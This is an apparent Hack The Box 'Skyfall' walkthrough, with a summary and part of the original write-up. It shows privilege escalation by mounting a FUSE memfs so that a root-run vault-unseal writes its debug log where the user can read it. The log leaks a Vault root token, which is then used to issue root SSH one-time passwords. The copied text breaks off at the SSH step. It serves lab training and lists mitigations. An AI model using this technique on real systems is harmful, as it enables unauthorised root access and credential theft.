
##
## skyfall intended
## c/o https://0xdf.gitlab.io/2024/08/31/htb-skyfall.html
##


##
##

---

# Skyfall (HTB) – Full Walkthrough, (root)

## 1. Enumeration of `vault-unseal`

On the box, there is a binary `/root/vault/vault-unseal` which can be executed with `sudo` by the `askyy` user:

```bash
askyy@skyfall:~$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -h
```

Help output:

```
Usage:
  vault-unseal [OPTIONS]

Application Options:
  -v, --verbose        enable verbose output
  -d, --debug          enable debugging output to file (extra logging)
  -c, --config=PATH    path to configuration file

Help Options:
  -h, --help           Show this help message
```

💡 **Observation:** This looks like a customized version of [vault-unseal by lrstanley](https://github.com/lrstanley/vault-unseal). Normally the upstream tool supports `--log-path`, but here only `--debug` exists, which writes to a `debug.log` file in the **current working directory**.

So if we run:

```bash
sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -vd
```

It indeed writes `debug.log`. But because the working directory defaults to the user’s `$PWD`, the file is created as **root:root** with restrictive permissions:

```bash
askyy@skyfall:~$ ls -l
-rw------- 1 root root  590 Aug 27 12:37 debug.log
```

Result: we can rename/delete this log but *not read it*.

---

## 2. Idea: Redirect Root-Written Logs Into Our Control

Problem: root writes sensitive data into `debug.log`, but we want to read it.  
Solution: abuse **FUSE** file systems to “trick” root into writing into something we control.

### 2.1 Background – FUSE and `user_allow_other`

- **FUSE (Filesystem in Userspace):** lets unprivileged users mount their own filesystems.  
- Normally, only the user who mounted the FS can access it.  
- But if `/etc/fuse.conf` contains:

```
user_allow_other
```

Then filesystems can be mounted with `allow_other`, meaning *other users (including root)* can also access the mount.

📌 Security risk: if root writes to a file in a user-owned mount, permissions may grant the non-root user visibility.

---

### 2.2 Why Not Use SSHFS?

One option would be to mount back to our attacker’s host over `sshfs`. But this exposes our machine over SSH — not ideal in HTB labs.  
Instead, we’ll use a local FUSE project: **go-fuse/memfs**.

---

## 3. Using `memfs` (Go-FUSE Example)

### 3.1 Compile `memfs`

On our attacker machine:

```bash
cd go-fuse/example/memfs
go build -buildvcs=false
```

This produces:

```
main.go
memfs   (binary)
```

### 3.2 How `memfs` Works

Usage:

```bash
./memfs MOUNTPOINT BACKING-PREFIX
```

- `MOUNTPOINT`: directory where to mount FS.  
- `BACKING-PREFIX`: prefix where file writes get mirrored.

Demo:

```bash
mkdir ~/testfs
./memfs ~/testfs memfsoutput-
```

From another terminal:

```bash
echo "testing..." > ~/testfs/file1
```

Result: a log file `memfsoutput-1` appears in the *launch directory*, capturing the content.

### 3.3 Modifying to Support `allow_other`

If root writes to FS, without `allow_other` it fails (`Permission denied`).  
Fix: edit `main.go` to include:

```go
server, err := fuse.NewServer(conn.RawFS(), mountPoint, &fuse.MountOptions{
    Debug: *debug,
    AllowOther: true,
})
```

Rebuild:

```bash
go build -buildvcs=false
```

Now, root can also write.

---

## 4. Deploy on Skyfall

Upload and run:

```bash
askyy@skyfall:/dev/shm$ wget http://10.10.14.6/memfs
chmod +x memfs
mkdir out
./memfs out/ out
```

It hangs on `Mounted!` (normal). Open another shell:

```bash
cd /dev/shm/out
sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -vd
```

Now check:

```bash
cat debug.log
```

🎉 Output:

```
Master token found in config: hvs.I0ewVsmaKU1SwVZAKR3T0mmG
```

---

## 5. Vault Token Abuse

Now we have a **master/root Vault token**.

On attacker machine:

```bash
vault login
Token (will be hidden): hvs.I0ewVsmaKU1SwVZAKR3T0mmG
```

Result:

```
Success! You are authenticated.
Policies: ["root"]
```

This token has **root policy** → complete control of Vault.

---

## 6. Exploiting Vault SSH Backend

Vault has an SSH secrets engine enabled:

```bash
vault list ssh/roles
```

Shows:

```
admin_otp_key_role
dev_otp_key_role
```

Inspect one:

```bash
vault read ssh/roles/admin_otp_key_role
```

```
allowed_users   root
key_type        otp
port            22
cidr_list       10.0.0.0/8
```

This means: Vault can generate **OTP-based root SSH logins**.

Generate OTP:

```bash
vault write ssh/creds/admin_otp_key_role ip=127.0.0.1
```

Example output:

```
Key           Value
---           -----
otp           7f9a2e1b-abc1-45ce
```

Now SSH:

```bash
ssh root@skyfall.htb
# Enter OTP when prompted as password
```

Boom — root shell.

---

## Wrap-up / Variations

- **Alternative exploit:** Instead of memfs, you could mount with `sshfs` or `curlftpfs` if root was logging to configurable paths.  
- **Privilege escalation vector:** Here the privilege escalation is specifically via `vault-unseal` logging unsafe secrets into a world-exposed FUSE mount.  
- **Mitigation on real systems:**
  - Remove `user_allow_other` from `/etc/fuse.conf`
  - Configure logs to safe paths not influenced by user CWD
  - Avoid storing Vault root tokens in config  

##
##


Running this program with -h shows the help menu:

```
askyy@skyfall:~$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -h
Usage:
  vault-unseal [OPTIONS]

Application Options:
  -v, --verbose        enable verbose output
  -d, --debug          enable debugging output to file (extra logging)
  -c, --config=PATH    path to configuration file

Help Options:
  -h, --help           Show this help message
It looks like a modified version of [this program][(https://github.com/lrstanley/vault-unseal). Instead of offering --log-path, it offers --debug.

Running it does generate a debug.log file in the current directory:

askyy@skyfall:~$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -vd
[+] Reading: /etc/vault-unseal.yaml
[-] Security Risk!
[+] Found Vault node: http://prd23-vault-internal.skyfall.htb
[>] Check interval: 5s
[>] Max checks: 5
[>] Checking seal status
[+] Vault sealed: false
askyy@skyfall:~$ ls -l
total 8
-rw------- 1 root root  590 Aug 27 12:37 debug.log
-rw-r----- 1 root askyy  33 Aug 25 17:49 user.txt
It is owned by root and only readable by root. askyy can rename it and delete it, but not access it’s contents directly.

Abusing Fuse
Background
This is a rather niche case, but there’s a file that root is writing that I want to read. I can control where it writes, but still can’t see it.

I’m going to abuse Filesystem in Userspace (or FUSE) for this. It’s installed on many Linux distros by default and used for virtual filesystems. In the default /etc/fuse.conf, there’s one risky option (I believe commented out by default), user_allow_other:

# The file /etc/fuse.conf allows for the following parameters:
#
# user_allow_other - Using the allow_other mount option works fine as root, in
# order to have it work as user you need user_allow_other in /etc/fuse.conf as
# well. (This option allows users to use the allow_other option.) You need
# allow_other if you want users other than the owner to access a mounted fuse.
# This option must appear on a line by itself. There is no value, just the
# presence of the option.

#user_allow_other


# mount_max = n - this option sets the maximum number of mounts.
# Currently (2014) it must be typed exactly as shown
# (with a single space before and after the equals sign).

#mount_max = 1000
This StackOverflow answer goes into the risks of this configuration.

Basically, when a user creates a filesystem, without this option, only that user can access the filesystem. However, once user_allow_other is activated, then other users can create filesystems that other users can access.

FUSE Applications
A very common FUSE application is sshfs, which allows for creating a filesystem on a remote computer over SSH. So in theory, I could SSHFS from Skyfall back into my host, creating a mount on Skyfall that maps to a folder on my host. Then, because of user_allow_others, when root writes the log file to this mount, it will show up on my system, and I can access it as the user I SSHed as.

However, opening my machine to SSH in the HTB labs is something I generally avoid doing. There’s a neat Go project, go-fuse, that has a bunch of example scripts the create various FUSE-based applications. One of particular interest is memfs. This mounts a folder as a FUSE filesystem, and logs all files written to into that FS to files.

Local memfs Demo
I’ll clone the repo to my box and go into the examples/memfs directory. There I’ll build the project:

oxdf@hacky$ ls
main.go
oxdf@hacky$ go build
error obtaining VCS status: exit status 128
        Use -buildvcs=false to disable VCS stamping.
oxdf@hacky$ go build -buildvcs=false
oxdf@hacky$ ls
main.go  memfs
The memfs binary takes a directory to mount and a prefix for the output files:

oxdf@hacky$ ./memfs 
usage: main MOUNTPOINT BACKING-PREFIX
I’ll create a test directory and run it, where it hangs:

oxdf@hacky$ ./memfs ~/testfs/ memfsoutput-
Mounted!
From another terminal, I’ll write some files into the new FS:

oxdf@hacky$ echo "testing..." > testfs/test1
oxdf@hacky$ echo "testing again..." > testfs/test2
In the directory I ran memfs from, there’s two new files:

oxdf@hacky$ ls
main.go  memfs  memfsoutput-1  memfsoutput-2
oxdf@hacky$ cat memfsoutput-1
testing...
oxdf@hacky$ cat memfsoutput-2
testing again...
If I try to write to the filesystem as root, it fails:

root@hacky:/home/oxdf# echo "this is a root test" > testfs/from_root
-bash: testfs/from_root: Permission denied
That’s because my system isn’t set up with user_allow_others. If I go into /etc/fuse.conf and uncomment that line, it still fails. I’ll need to update the Go script slightly. I’ll kill the mount, and sudo umount ~/testfs.

In main.go, I’ll add an option for the fuse creation:

        server, err := fuse.NewServer(conn.RawFS(), mountPoint, &fuse.MountOptions{
                Debug: *debug,
                AllowOther: true, // added this
        })
Now I’ll rebuild and re-mount:

oxdf@hacky$ go build -buildvcs=false
oxdf@hacky$ ./memfs ~/testfs/ memfsoutput-
Mounted!
Now from a root shell:

root@hacky:/home/oxdf# echo "now it should work" > testfs/as_root
root@hacky:/home/oxdf# cat testfs/as_root 
now it should work
And the file got logged:

root@hacky:/home/oxdf# cat hackthebox/skyfall-10.10.11.254/go-fuse/example/memfs/memfsoutput-1 
now it should work
On Skyfall
I’ll upload the compiled memfs to Skyfall, create a directory, and mount it:

askyy@skyfall:/dev/shm$ wget 10.10.14.6/memfs
--2024-08-27 18:33:29--  http://10.10.14.6/memfs
Connecting to 10.10.14.6:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3500122 (3.3M) [application/octet-stream]
Saving to: ‘memfs’

memfs                   100%[=============================>]   3.34M  11.8MB/s    in 0.3s    

2024-08-27 18:33:30 (11.8 MB/s) - ‘memfs’ saved [3500122/3500122]

askyy@skyfall:/dev/shm$ mkdir out
askyy@skyfall:/dev/shm$ chmod +x memfs 
askyy@skyfall:/dev/shm$ ./memfs
usage: main MOUNTPOINT BACKING-PREFIX
askyy@skyfall:/dev/shm$ ./memfs out/ out
Mounted!
In another SSH window, I’ll go into that directory and run vault-unseal:

askyy@skyfall:/dev/shm/out$ cat debug.log 
2024/08/27 18:34:49 Initializing logger...
2024/08/27 18:34:49 Reading: /etc/vault-unseal.yaml
2024/08/27 18:34:49 Security Risk!
2024/08/27 18:34:49 Master token found in config: hvs.I0ewVsmaKU1SwVZAKR3T0mmG
2024/08/27 18:34:49 Found Vault node: http://prd23-vault-internal.skyfall.htb
2024/08/27 18:34:49 Check interval: 5s
2024/08/27 18:34:49 Max checks: 5
2024/08/27 18:34:49 Establishing connection to Vault...
2024/08/27 18:34:49 Successfully connected to Vault: http://prd23-vault-internal.skyfall.htb
2024/08/27 18:34:49 Checking seal status
2024/08/27 18:34:49 Vault sealed: false
It created debug.log, but because of where it’s stored, it’s owned by askyy:

askyy@skyfall:/dev/shm/out$ ls -l
total 4
-rw------- 1 askyy askyy 590 Aug 27 18:34 debug.log
Admin Vault
debug.log
The debug.log file leads the token being used with it:

askyy@skyfall:/dev/shm/out$ cat debug.log 
2024/08/27 18:34:49 Initializing logger...
2024/08/27 18:34:49 Reading: /etc/vault-unseal.yaml
2024/08/27 18:34:49 Security Risk!
2024/08/27 18:34:49 Master token found in config: hvs.I0ewVsmaKU1SwVZAKR3T0mmG
2024/08/27 18:34:49 Found Vault node: http://prd23-vault-internal.skyfall.htb
2024/08/27 18:34:49 Check interval: 5s
2024/08/27 18:34:49 Max checks: 5
2024/08/27 18:34:49 Establishing connection to Vault...
2024/08/27 18:34:49 Successfully connected to Vault: http://prd23-vault-internal.skyfall.htb
2024/08/27 18:34:49 Checking seal status
2024/08/27 18:34:49 Vault sealed: false
Login
This token works via the vault login command:

oxdf@hacky$ vault login
Token (will be hidden): 
Success! You are now authenticated. The token information displayed below
is already stored in the token helper. You do NOT need to run "vault login"
again. Future Vault requests will automatically use this token.
                                               
Key                  Value                                                                    
---                  -----  
token                hvs.I0ewVsmaKU1SwVZAKR3T0mmG                
token_accessor       bXBeXR3r92WGQ8XgEDx6pIFu                                                 
token_duration       ∞                         
token_renewable      false
token_policies       ["root"]               
identity_policies    []       
policies             ["root"]
It has the root policy! That’s promising.

SSH
There’s a bunch of enumeration I could do, but I’ll remember there were two SSH roles:

oxdf@hacky$ vault list ssh/roles
Keys
----
admin_otp_key_role
dev_otp_key_role
This token can read the roles:

oxdf@hacky$ vault read ssh/roles/admin_otp_key_role
Key                  Value
---                  -----
allowed_users        root
cidr_list            10.0.0.0/8
default_user         nobody
exclude_cidr_list    n/a
key_type             otp
port                 22
The user allowed is root. I’ll SSH:
